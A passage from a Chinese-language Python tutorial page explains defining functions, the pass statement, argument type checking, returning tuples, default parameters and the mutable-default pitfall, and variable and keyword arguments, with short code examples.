False</span><br></pre></td></tr></table></figure><p>函数名其实就是指向一个函数对象的引用，完全可以把函数名赋给一个变量，相当于给这个函数起了一个“别名”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = abs # 变量a指向abs函数</span><br><span class="line">a(-1) # 所以也可以通过a调用abs函数 输出：1</span><br></pre></td></tr></table></figure><blockquote><p>✏️ 练习题：</p></blockquote><p>请利用 Python 内置的<code>hex()</code>函数把一个整数转换成十六进制表示的字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(hex(int(input())))</span><br></pre></td></tr></table></figure><h2 id="2-2-定义函数"><a href="#2-2-定义函数" class="headerlink" title="2.2 定义函数"></a>2.2 定义函数</h2><h3 id="2-2-1-def-定义"><a href="#2-2-1-def-定义" class="headerlink" title="2.2.1 def 定义"></a>2.2.1 def 定义</h3><p>在Python中，定义一个函数要使用<code>def</code>语句，依次写出函数名、括号、括号中的参数和冒号<code>:</code>，然后，在缩进块中编写函数体，函数的返回值用<code>return</code>语句返回。</p><p>我们以自定义一个求绝对值的<code>my_abs</code>函数为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def my_abs(x):</span><br><span class="line">    if x &gt;= 0:</span><br><span class="line">        return x</span><br><span class="line">    else:</span><br><span class="line">        return -x</span><br><span class="line">print(my_abs(-99))</span><br></pre></td></tr></table></figure><p>!&gt; 请注意，函数体内部的语句在执行时，一旦执行到<code>return</code>时，函数就执行完毕，并将结果返回。因此，函数内部通过条件判断和循环可以实现非常复杂的逻辑。</p><p>如果没有<code>return</code>语句，函数执行完毕后也会返回结果，只是结果为<code>None</code>。<code>return None</code>可以简写为<code>return</code>。</p><p>在 Python 交互环境中定义函数时，注意 Python 会出现<code>...</code>的提示。函数定义结束后需要按两次回车重新回到<code>&gt;&gt;&gt;</code>提示符下：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200628200631.png" alt="image-20200628200630220" title="image-20200628200630220"></p><p>如果你已经把<code>my_abs()</code>的函数定义保存为<code>abstest.py</code>文件了，那么，可以在该文件的当前目录下启动 Python 解释器，用<code>from abstest import my_abs</code>来导入<code>my_abs()</code>函数，注意<code>abstest</code>是文件名（不含<code>.py</code>扩展名）：</p><p><img src="https://cos.gjcloak.xyz/NoteBook/20200628200736.png" alt="image-20200628200735560" title="image-20200628200735560"></p><h3 id="2-2-2-空函数"><a href="#2-2-2-空函数" class="headerlink" title="2.2.2 空函数"></a>2.2.2 空函数</h3><p>如果想定义一个什么事也不做的空函数，可以用<code>pass</code>语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def nop():</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p><code>pass</code>语句什么都不做，那有什么用？实际上<code>pass</code>可以用来作为占位符，比如现在还没想好怎么写函数的代码，就可以先放一个<code>pass</code>，让代码能运行起来。</p><p><code>pass</code>还可以用在其他语句里，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if age &gt;= 18:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>缺少了<code>pass</code>，代码运行就会有语法错误。</p><h3 id="2-2-3-参数检查"><a href="#2-2-3-参数检查" class="headerlink" title="2.2.3 参数检查"></a>2.2.3 参数检查</h3><p>调用函数时，如果参数个数不对，Python 解释器会自动检查出来，并抛出<code>TypeError</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; my_abs(1, 2)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: my_abs() takes 1 positional argument but 2 were given</span><br></pre></td></tr></table></figure><p>但是如果参数类型不对，Python 解释器就无法帮我们检查。试试<code>my_abs</code>和内置函数<code>abs</code>的差别：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; my_abs(&#x27;A&#x27;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 2, in my_abs</span><br><span class="line">TypeError: unorderable types: str() &gt;= int()</span><br><span class="line">&gt;&gt;&gt; abs(&#x27;A&#x27;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: bad operand type for abs(): &#x27;str&#x27;</span><br></pre></td></tr></table></figure><p>当传入了不恰当的参数时，内置函数<code>abs</code>会检查出参数错误，而我们定义的<code>my_abs</code>没有参数检查，会导致<code>if</code>语句出错，出错信息和<code>abs</code>不一样。所以，这个函数定义不够完善。</p><p>让我们修改一下<code>my_abs</code>的定义，对参数类型做检查，只允许整数和浮点数类型的参数。数据类型检查可以用内置函数<code>isinstance()</code>实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def my_abs(x):</span><br><span class="line">    if not isinstance(x, (int, float)):</span><br><span class="line">        raise TypeError(&#x27;bad operand type&#x27;)</span><br><span class="line">    if x &gt;= 0:</span><br><span class="line">        return x</span><br><span class="line">    else:</span><br><span class="line">        return -x</span><br></pre></td></tr></table></figure><p>添加了参数检查后，如果传入错误的参数类型，函数就可以抛出一个错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; my_abs(&#x27;A&#x27;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 3, in my_abs</span><br><span class="line">TypeError: bad operand type</span><br></pre></td></tr></table></figure><p>错误和异常处理将在后续讲到。</p><h3 id="2-2-4-返回多个值"><a href="#2-2-4-返回多个值" class="headerlink" title="2.2.4 返回多个值"></a>2.2.4 返回多个值</h3><p>函数可以返回多个值吗？答案是肯定的。</p><p>比如在游戏中经常需要从一个点移动到另一个点，给出坐标、位移和角度，就可以计算出新的坐标：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line"></span><br><span class="line">def move(x, y, step, angle=0):</span><br><span class="line">    nx = x + step * math.cos(angle)</span><br><span class="line">    ny = y - step * math.sin(angle)</span><br><span class="line">    return nx, ny</span><br></pre></td></tr></table></figure><p><code>import math</code>语句表示导入<code>math</code>包，并允许后续代码引用<code>math</code>包里的<code>sin</code>、<code>cos</code>等函数。</p><p>然后，我们就可以同时获得返回值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x, y = move(100, 100, 60, math.pi / 6)</span><br><span class="line">print(x, y) # 151.96152422706632 70.0</span><br></pre></td></tr></table></figure><p>但其实这只是一种假象，Python 函数返回的仍然是单一值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = move(100, 100, 60, math.pi / 6)</span><br><span class="line">print(r) # (151.96152422706632, 70.0)</span><br></pre></td></tr></table></figure><p>原来返回值是一个 tuple！但是，在语法上，返回一个 tuple 可以省略括号，而多个变量可以同时接收一个 tuple，按位置赋给对应的值，所以，Python 的函数返回多值其实就是返回一个 tuple，但写起来更方便。</p><blockquote><p>✏️ 小结：</p></blockquote><ul><li>定义函数时，需要确定<code>函数名</code>和<code>参数个数</code>；</li><li>如果有必要，可以先对参数的<code>数据类型</code>做检查；</li><li>函数体内部可以用<code>return</code>随时返回函数结果；</li><li>函数执行完毕也没有<code>return</code>语句时，自动<code>return None</code>。</li><li>函数可以同时返回多个值，但其实就是一个<code>tuple</code>。</li></ul><blockquote><p>✏️ 练习题：</p></blockquote><p>请定义一个函数<code>quadratic(a, b, c)</code>，接收 3 个参数，返回一元二次方程 $ax^2+bx+c&#x3D;0$ 的两个解。</p><p>提示：</p><p>一元二次方程的求根公式为：</p><p>$$ x&#x3D;\dfrac{-b±\sqrt{b^2-4ac}}{2a} $$</p><p>计算平方根可以调用<code>math.sqrt()</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">print(math.sqrt(2)) # 1.4142135623730951</span><br></pre></td></tr></table></figure><p>粗略的定义函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import math</span><br><span class="line">def quadratic(a,b,c):</span><br><span class="line">    delta=b**2-4*a*c</span><br><span class="line">    x1=(-b+math.sqrt(delta))/(2*a)</span><br><span class="line">    x2=(-b-math.sqrt(delta))/(2*a)</span><br><span class="line">    return x1,x2</span><br><span class="line">x=int(input(&#x27;enter a:&#x27;))</span><br><span class="line">y=int(input(&#x27;enter b:&#x27;))</span><br><span class="line">z=int(input(&#x27;enter c:&#x27;))</span><br><span class="line">print(&#x27;quadratic(x,y,z)&#x27;, quadratic(x, y, z))</span><br></pre></td></tr></table></figure><p>当然后期还要细化，因为有些没有考虑！</p><h2 id="2-3-函数的参数"><a href="#2-3-函数的参数" class="headerlink" title="2.3 函数的参数"></a>2.3 函数的参数</h2><p><strong>定义函数的时候，我们把参数的名字和位置确定下来，函数的接口定义就完成了。</strong>对于函数的调用者来说，只需要知道如何传递正确的参数，以及函数将返回什么样的值就够了，函数内部的复杂逻辑被封装起来，调用者无需了解。</p><p>Python 的函数定义非常简单，但灵活度却非常大。除了正常定义的必选参数外，还可以使用<code>默认参数</code>、<code>可变参数</code>和<code>关键字参数</code>，使得函数定义出来的接口，不但能处理复杂的参数，还可以简化调用者的代码。</p><h3 id="2-3-1-位置参数"><a href="#2-3-1-位置参数" class="headerlink" title="2.3.1 位置参数"></a>2.3.1 位置参数</h3><p>我们先写一个计算 $x^2$ 的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def power(x):</span><br><span class="line">    return x * x</span><br></pre></td></tr></table></figure><p>对于<code>power(x)</code>函数，参数<code>x</code>就是一个位置参数。</p><p>当我们调用<code>power</code>函数时，必须传入有且仅有的一个参数<code>x</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(power(5)) # 25</span><br></pre></td></tr></table></figure><p>如果要计算 x 的 n 次方，可以把<code>power(x)</code>修改为<code>power(x, n)</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def power(x, n):</span><br><span class="line">    s = 1</span><br><span class="line">    while n &gt; 0:</span><br><span class="line">        n = n - 1</span><br><span class="line">        s = s * x</span><br><span class="line">    return s</span><br></pre></td></tr></table></figure><p>修改后的<code>power(x, n)</code>函数有两个参数：<code>x</code>和<code>n</code>，这两个参数都是位置参数，调用函数时，传入的两个值按照位置顺序依次赋给参数<code>x</code>和<code>n</code>。</p><h3 id="2-3-2-默认参数"><a href="#2-3-2-默认参数" class="headerlink" title="2.3.2 默认参数"></a>2.3.2 默认参数</h3><p>新的<code>power(x, n)</code>函数定义没有问题，但是，旧的调用代码失败了，原因是我们增加了一个参数，导致旧的代码因为缺少一个参数而无法正常调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; power(5)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">TypeError: power() missing 1 required positional argument: &#x27;n&#x27;</span><br></pre></td></tr></table></figure><p>Python 的错误信息很明确：调用函数<code>power()</code>缺少了一个位置参数<code>n</code>。</p><p>这个时候，默认参数就排上用场了。由于我们经常计算 $x^2$，所以，完全可以把第二个参数 n 的默认值设定为 2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def power(x, n=2):</span><br><span class="line">    s = 1</span><br><span class="line">    while n &gt; 0:</span><br><span class="line">        n = n - 1</span><br><span class="line">        s = s * x</span><br><span class="line">    return s</span><br></pre></td></tr></table></figure><p>这样，当我们调用<code>power(5)</code>时，相当于调用<code>power(5, 2)</code>：</p><p>而对于<code>n &gt; 2</code>的其他情况，就必须明确地传入 n，比如<code>power(5, 3)</code>。</p><p>从上面的例子可以看出，默认参数可以简化函数的调用。设置默认参数时，有几点要注意：</p><ul><li>一是必选参数在前，默认参数在后，否则 Python 的解释器会报错（思考一下为什么默认参数不能放在必选参数前面）；</li><li>二是如何设置默认参数。当函数有多个参数时，把变化大的参数放前面，变化小的参数放后面。变化小的参数就可以作为默认参数。</li></ul><p>使用默认参数有什么好处？最大的好处是能降低调用函数的难度。</p><p>举个例子，我们写个一年级小学生注册的函数，需要传入<code>name</code>和<code>gender</code>两个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def enroll(name, gender):</span><br><span class="line">    print(&#x27;name:&#x27;, name)</span><br><span class="line">    print(&#x27;gender:&#x27;, gender)</span><br></pre></td></tr></table></figure><p>这样，调用<code>enroll()</code>函数只需要传入两个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; enroll(&#x27;Sarah&#x27;, &#x27;F&#x27;)</span><br><span class="line">name: Sarah</span><br><span class="line">gender: F</span><br></pre></td></tr></table></figure><p>如果要继续传入年龄、城市等信息怎么办？这样会使得调用函数的复杂度大大增加。</p><p>我们可以把年龄和城市设为默认参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def enroll(name, gender, age=6, city=&#x27;Beijing&#x27;):</span><br><span class="line">    print(&#x27;name:&#x27;, name)</span><br><span class="line">    print(&#x27;gender:&#x27;, gender)</span><br><span class="line">    print(&#x27;age:&#x27;, age)</span><br><span class="line">    print(&#x27;city:&#x27;, city)</span><br></pre></td></tr></table></figure><p>这样，大多数学生注册时不需要提供年龄和城市，只提供必须的两个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; enroll(&#x27;Sarah&#x27;, &#x27;F&#x27;)</span><br><span class="line">name: Sarah</span><br><span class="line">gender: F</span><br><span class="line">age: 6</span><br><span class="line">city: Beijing</span><br></pre></td></tr></table></figure><p>只有与默认参数不符的学生才需要提供额外的信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enroll(&#x27;Bob&#x27;, &#x27;M&#x27;, 7)</span><br><span class="line">enroll(&#x27;Adam&#x27;, &#x27;M&#x27;, city=&#x27;Tianjin&#x27;)</span><br></pre></td></tr></table></figure><p>可见，默认参数降低了函数调用的难度，而一旦需要更复杂的调用时，又可以传递更多的参数来实现。无论是简单调用还是复杂调用，函数只需要定义一个。</p><p>有多个默认参数时，调用的时候，既可以按顺序提供默认参数，比如调用<code>enroll(&#39;Bob&#39;, &#39;M&#39;, 7)</code>，意思是，除了<code>name</code>，<code>gender</code>这两个参数外，最后 1 个参数应用在参数<code>age</code>上，<code>city</code>参数由于没有提供，仍然使用默认值。</p><p>也可以不按顺序提供部分默认参数。当不按顺序提供部分默认参数时，需要把参数名写上。比如调用<code>enroll(&#39;Adam&#39;, &#39;M&#39;, city=&#39;Tianjin&#39;)</code>，意思是，<code>city</code>参数用传进去的值，其他默认参数继续使用默认值。</p><p>默认参数很有用，但使用不当，也会掉坑里。默认参数有个最大的坑，演示如下：</p><p>先定义一个函数，传入一个 list，添加一个<code>END</code>再返回：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def add_end(L=[]):</span><br><span class="line">    L.append(&#x27;END&#x27;)</span><br><span class="line">    return L</span><br></pre></td></tr></table></figure><p>当你正常调用时，结果似乎不错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; add_end([1, 2, 3])</span><br><span class="line">[1, 2, 3, &#x27;END&#x27;]</span><br><span class="line">&gt;&gt;&gt; add_end([&#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;])</span><br><span class="line">[&#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;END&#x27;]</span><br></pre></td></tr></table></figure><p>当你使用默认参数调用时，一开始结果也是对的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; add_end()</span><br><span class="line">[&#x27;END&#x27;]</span><br></pre></td></tr></table></figure><p>但是，再次调用<code>add_end()</code>时，结果就不对了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; add_end()</span><br><span class="line">[&#x27;END&#x27;, &#x27;END&#x27;]</span><br><span class="line">&gt;&gt;&gt; add_end()</span><br><span class="line">[&#x27;END&#x27;, &#x27;END&#x27;, &#x27;END&#x27;]</span><br></pre></td></tr></table></figure><p>默认参数是<code>[]</code>，但是函数似乎每次都“记住了”上次添加了<code>&#39;END&#39;</code>后的 list。</p><p>原因解释如下：</p><p>⭐ Python 函数在定义的时候，默认参数<code>L</code>的值就被计算出来了，即<code>[]</code>，因为默认参数<code>L</code>也是一个变量，它指向对象<code>[]</code>，每次调用该函数，如果改变了<code>L</code>的内容，则下次调用时，默认参数的内容就变了，不再是函数定义时的<code>[]</code>了。</p><p>? <strong>定义默认参数要牢记一点：默认参数必须指向不变对象！</strong></p><p>要修改上面的例子，我们可以用<code>None</code>这个不变对象来实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def add_end(L=None):</span><br><span class="line">    if L is None:</span><br><span class="line">        L = []</span><br><span class="line">    L.append(&#x27;END&#x27;)</span><br><span class="line">    return L</span><br></pre></td></tr></table></figure><p>现在，无论调用多少次，都不会有问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; add_end()</span><br><span class="line">[&#x27;END&#x27;]</span><br><span class="line">&gt;&gt;&gt; add_end()</span><br><span class="line">[&#x27;END&#x27;]</span><br></pre></td></tr></table></figure><p>为什么要设计<code>str</code>、<code>None</code>这样的不变对象呢？因为不变对象一旦创建，对象内部的数据就不能修改，这样就减少了由于修改数据导致的错误。此外，由于对象不变，多任务环境下同时读取对象不需要加锁，同时读一点问题都没有。我们在编写程序时，如果可以设计一个不变对象，那就尽量设计成不变对象。</p><h3 id="2-3-3-可变参数"><a href="#2-3-3-可变参数" class="headerlink" title="2.3.3 可变参数"></a>2.3.3 可变参数</h3><p>在 Python 函数中，还可以定义可变参数。顾名思义，可变参数就是传入的参数个数是可变的，可以是 1 个、2 个到任意个，还可以是 0 个。</p><p>我们以数学题为例子，给定一组数字 a，b，c……，请计算 $a^2 + b^2 + c^2 + …$</p><p>要定义出这个函数，我们必须确定输入的参数。由于参数个数不确定，我们首先想到可以把 a，b，c…… 作为一个 list 或 tuple 传进来，这样，函数可以定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def calc(numbers):</span><br><span class="line">    sum = 0</span><br><span class="line">    for n in numbers:</span><br><span class="line">        sum = sum + n * n</span><br><span class="line">    return sum</span><br></pre></td></tr></table></figure><p>但是调用的时候，需要先组装出一个 list 或 tuple：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(calc([1, 2, 3])) # 14</span><br><span class="line">print(calc((1, 3, 5, 7))) # 84</span><br></pre></td></tr></table></figure><p>如果利用可变参数，调用函数的方式可以简化成这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(calc(1, 2, 3)) # 14</span><br><span class="line">print(calc(1, 3, 5, 7)) # 84</span><br></pre></td></tr></table></figure><p>所以，我们把函数的参数改为可变参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def calc(*numbers):</span><br><span class="line">    sum = 0</span><br><span class="line">    for n in numbers:</span><br><span class="line">        sum = sum + n * n</span><br><span class="line">    return sum</span><br></pre></td></tr></table></figure><p>定义可变参数和定义一个 list 或 tuple 参数相比，仅仅在参数前面加了一个<code>*</code>号。在函数内部，参数<code>numbers</code>接收到的是一个 tuple，因此，函数代码完全不变。但是，调用该函数时，可以传入任意个参数，包括 0 个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(calc(1, 2)) # 5</span><br><span class="line">print(calc()) # 0</span><br></pre></td></tr></table></figure><p>❓ 如果已经有一个 list 或者 tuple，要调用一个可变参数怎么办？可以这样做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nums = [1, 2, 3]</span><br><span class="line">print(calc(nums[0], nums[1], nums[2])) # 14</span><br></pre></td></tr></table></figure><p>这种写法当然是可行的，问题是太繁琐，所以 Python 允许你在 list 或 tuple 前面加一个<code>*</code>号，把 list 或 tuple 的元素变成可变参数传进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nums = [1, 2, 3]</span><br><span class="line">print(calc(*nums)) # 14</span><br></pre></td></tr></table></figure><p><code>*nums</code>表示把<code>nums</code>这个list的所有元素作为可变参数传进去。这种写法相当有用，而且很常见。</p><h3 id="2-3-4-关键字参数"><a href="#2-3-4-关键字参数" class="headerlink" title="2.3.4 关键字参数"></a>2.3.4 关键字参数</h3><p>可变参数允许你传入 0 个或任意个参数，这些可变参数在函数调用时自动组装为一个 tuple。而关键字参数允许你传入 0 个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个 dict。请看示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, **kw):</span><br><span class="line">    print(&#x27;name:&#x27;, name, &#x27;age:&#x27;, age, &#x27;other:&#x27;, kw)</span><br></pre></td></tr></table></figure><p>函数<code>person</code>除了必选参数<code>name</code>和<code>age</code>外，还接受关键字参数<code>kw</code>。在调用该函数时，可以只传入必选参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person(&#x27;Michael&#x27;, 30) </span><br><span class="line"># name: Michael age: 30 other: &#123;&#125;</span><br></pre></td></tr></table></figure><p>也可以传入任意个数的关键字参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">person(&#x27;Bob&#x27;, 35, city=&#x27;Beijing&#x27;)</span><br><span class="line"># name: Bob age: 35 other: &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;&#125;</span><br><span class="line">person(&#x27;Adam&#x27;, 45, gender=&#x27;M&#x27;, job=&#x27;Engineer&#x27;)</span><br><span class="line"># name: Adam age: 45 other: &#123;&#x27;gender&#x27;: &#x27;M&#x27;, &#x27;jo</span><br></pre></td></tr></table></figure><p>关键字参数有什么用？它可以扩展函数的功能。比如，在<code>person</code>函数里，我们保证能接收到<code>name</code>和<code>age</code>这两个参数，但是，如果调用者愿意提供更多的参数，我们也能收到。试想你正在做一个用户注册的功能，除了用户名和年龄是必填项外，其他都是可选项，利用关键字参数来定义这个函数就能满足注册的需求。</p><p>和可变参数类似，也可以先组装出一个 dict，然后，把该 dict 转换为关键字参数传进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extra = &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;</span><br><span class="line">person(&#x27;Jack&#x27;, 24, city=extra[&#x27;city&#x27;], job=extra[&#x27;job&#x27;])</span><br><span class="line"># name: Jack age: 24 other: &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;</span><br></pre></td></tr></table></figure><p>当然，上面复杂的调用可以用简化的写法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extra = &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;</span><br><span class="line">person(&#x27;Jack&#x27;, 24, **extra)</span><br><span class="line"># name: Jack age: 24 other: &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;</span><br></pre></td></tr></table></figure><p><code>**extra</code>表示把<code>extra</code>这个 dict 的所有 key-value 用关键字参数传入到函数的<code>**kw</code>参数，<code>kw</code>将获得一个 dict，注意<code>kw</code>获得的 dict 是<code>extra</code>的一份拷贝，对<code>kw</code>的改动不会影响到函数外的<code>extra</code>。</p><h3 id="2-3-5-命名关键字参数"><a href="#2-3-5-命名关键字参数" class="headerlink" title="2.3.5 命名关键字参数"></a>2.3.5 命名关键字参数</h3><p>对于关键字参数，函数的调用者可以传入任意不受限制的关键字参数。至于到底传入了哪些，就需要在函数内部通过<code>kw</code>检查。</p><p>仍以<code>person()</code>函数为例，我们希望检查是否有<code>city</code>和<code>job</code>参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def person(name, age, **kw):</span><br><span class="line">    if &#x27;city&#x27; in kw:</span><br><span class="line">        # 有city参数</span><br><span class="line">        pass</span><br><span class="line">    if &#x27;job&#x27; in kw:</span><br><span class="line">        # 有job参数</span><br><span class="line">        pass</span><br><span class="line">    print(&#x27;name:&#x27;, name, &#x27;age:&#x27;, age, &#x27;other:&#x27;, kw)</span><br></pre></td></tr></table></figure><p>但是调用者仍可以传入不受限制的关键字参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 